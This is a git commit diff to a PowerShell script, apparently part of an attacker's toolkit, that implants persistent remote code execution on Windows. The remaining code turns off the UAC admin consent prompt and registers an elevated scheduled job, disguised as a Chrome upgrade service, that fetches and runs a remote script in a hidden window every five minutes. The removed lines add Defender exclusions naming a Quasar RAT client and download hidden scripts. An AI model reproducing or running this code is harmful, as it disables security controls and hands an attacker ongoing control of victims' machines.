f3f6a38f68a7a0daaaeb022c4b26b85036a31bfb
cyb1l <60405884+4V4loon@users.noreply.github.com>
2022-04-27 17:40:02 +0400

    Update pastebin-pass.ps1

--- pastebin/pastebin-pass.ps1
+++ pastebin/pastebin-pass.ps1
@@ -1,51 +1,13 @@
-Add-MpPreference -ExclusionPath "$env:userprofile" -Force
-Add-MpPreference -ExclusionPath "$env:appdata" -Force
-Add-MpPreference -ExclusionPath "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup" -Force
-Add-MpPreference -ExclusionPath "$env:appdata\Microsoft" -Force
-Add-MpPreference -ExclusionExtension ".ps1" -Force
-Add-MpPreference -ExclusionExtension ".bat" -Force
-Add-MpPreference -ExclusionExtension ".exe" -Force
-Add-MpPreference -ExclusionExtension ".vbs" -Force
-Add-MpPreference -ExclusionProcess "powershell.exe" -Force
-Add-MpPreference -ExclusionProcess "cmd.exe" -Force
-Add-MpPreference -ExclusionProcess "Client.exe" -Force
-Add-MpPreference -ExclusionProcess "Quasar-Client.exe" -Force
-Add-MpPreference -ExclusionProcess "ChromeBackgroundService.exe" -Force
-Add-MpPreference -ExclusionProcess "NvidiaCore.exe" -Force
 Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
-$homedir = "$env:appdata\Chrome"
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/email.ps1' -OutFile $homedir\email.ps1
-
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/backdrop.ps1' -OutFile $homedir\backdrop.ps1
-
-if(Test-Path -Path $env:appdata\Microsoft\Windows\'Start Menu'\Programs\Startup\prelim.vbs){
-Remove-Item -Path $env:appdata\Microsoft\Windows\'Start Menu'\Programs\Startup\prelim.vbs -Force
-}
-
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/sec.vbs' -OutFile $homedir\sec.vbs
-
-attrib +h "$homedir\sec.vbs"
-attrib +h "$homedir\email.ps1"
-attrib +h "$homedir\backdrop.ps1"
-
-
-$jobname = "ChromeBackgroundService"
-#$script = "powershell.exe -executionpolicy bypass -NoProfile -WindowStyle Hidden -command cscript.exe $env:appdata\MICROS~1\Windows\STARTM~1\Programs\Startup\sec.vbs"
-$script = "powershell.exe -executionpolicy bypass -NoProfile -WindowStyle Hidden -command 'cscript.exe $homedir\sec.vbs'"
-$repeat = (New-TimeSpan -Minutes 50)
-
+$jobname = "ChromeAutoUpgradeService"
+$url = "https://raw.githubusercontent.com/4V4loon/tools/master/pastebin/pastebin-run.ps1"
+$run = Invoke-WebRequest -Uri $url -UseBasicParsing | select -ExpandProperty Content
+$script = "powershell.exe -executionpolicy bypass -NoProfile -WindowStyle Hidden -command $run"
+$repeat = (New-TimeSpan -Minutes 5)
 $scriptblock = [scriptblock]::Create($script)
 $trigger = @(
 	$(New-JobTrigger -AtStartup),
 	$(New-JobTrigger -Once -At (Get-Date).Date -RepeatIndefinitely -RepetitionInterval $repeat)
 )
-
 $options = New-ScheduledJobOption -RunElevated -ContinueIfGoingOnBattery -StartIfOnBattery -WakeToRun
 Register-ScheduledJob -Name $jobname -ScriptBlock $scriptblock -Trigger $trigger -ScheduledJobOption $options
-
-
-#schtasks /create /sc minute /mo 50 /tn "ChromeBackgroundService" /tr "powershell.exe -executionpolicy bypass -NoProfile -WindowStyle Hidden -command 'cscript.exe $homedir\sec.vbs'" /f
-
-#Set-ScheduledTask -TaskName "NvidiaUpdate" -User "NT AUTHORITY\SYSTEM"
-
-start-process "powershell.exe" -ArgumentList "powershell -file $homedir\backdrop.ps1" -WindowStyle Hidden -Verb RunAs
